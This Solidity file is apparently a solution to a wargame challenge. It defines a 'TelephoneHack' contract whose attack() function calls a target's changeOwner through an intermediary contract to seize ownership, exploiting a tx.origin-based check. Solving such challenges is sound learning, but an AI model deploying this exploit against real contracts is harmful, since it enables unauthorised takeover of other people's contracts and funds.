// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneHack {
    ITelephone telephoneContract;
    address owner;

    constructor(address _telephone) {
        owner = msg.sender;
        telephoneContract = ITelephone(_telephone);
    }

    function attack() public {
        require(msg.sender == owner, "Only owner can call this function");
        telephoneContract.changeOwner(msg.sender);
    }
}
